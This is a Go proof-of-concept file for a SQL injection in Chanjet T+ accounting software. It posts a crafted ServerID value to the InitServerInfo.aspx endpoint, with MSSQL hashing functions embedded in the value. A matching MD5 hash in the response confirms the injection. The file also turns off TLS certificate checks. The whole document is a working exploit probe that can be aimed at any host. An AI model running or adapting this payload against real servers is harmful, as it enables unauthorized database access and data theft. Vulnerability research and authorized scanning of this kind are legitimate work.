package poc

import (
	"bytes"
	"crypto/tls"
	"io"
	"log"
	"net/http"
	"regexp"
	"strings"
)

func TPlus_InitServerInfo(target string) {
	url := strings.TrimRight(target, "/")

	data := "operbtn=create&ServerID=1'%2b(select 1 where 1 in (SELECT sys.fn_varbintohexstr(hashbytes('MD5','123456'))))%2b'1"
	req, err := http.NewRequest("POST", url+"/tplus/UFAQD/InitServerInfo.aspx?preload=1", bytes.NewBufferString(data))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if err != nil {
		log.Println(err)
		return
	}
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Do(req)
	if err != nil {
		log.Println(err)
		return
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	reg := regexp.MustCompile("e10adc3949ba59abbe56e057f20f883e")
	mag := reg.MatchString(string(respBody))

	if resp.StatusCode == http.StatusOK && mag {
		log.Println("[+] 存在畅捷通T+ InitServerInfo.aspx SQL漏洞")
	}
}
